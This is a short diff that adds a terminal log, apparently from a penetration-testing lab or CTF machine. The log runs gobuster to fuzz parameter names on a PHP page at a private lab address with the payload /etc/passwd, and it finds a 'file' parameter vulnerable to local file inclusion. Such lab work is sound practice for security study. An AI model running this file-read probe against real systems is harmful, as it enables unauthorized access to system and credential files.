@@ -1,0 +1,19 @@
+└─$ gobuster fuzz \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -u "http://10.0.0.103/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" \
+  --exclude-length 0 \
+  -t 50
+===============================================================
+Gobuster v3.8.2
+===============================================================
+[+] Url:              http://10.0.0.103/blog-post/archives/randylogs.php?FUZZ=/etc/passwd
+[+] Exclude Length:   0
+[+] Threads:          50
+===============================================================
+Starting gobuster in fuzzing mode
+===============================================================
+[Status=200] [Length=2832] [Word=file] http://10.0.0.103/blog-post/archives/randylogs.php?file=%2Fetc%2Fpasswd
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
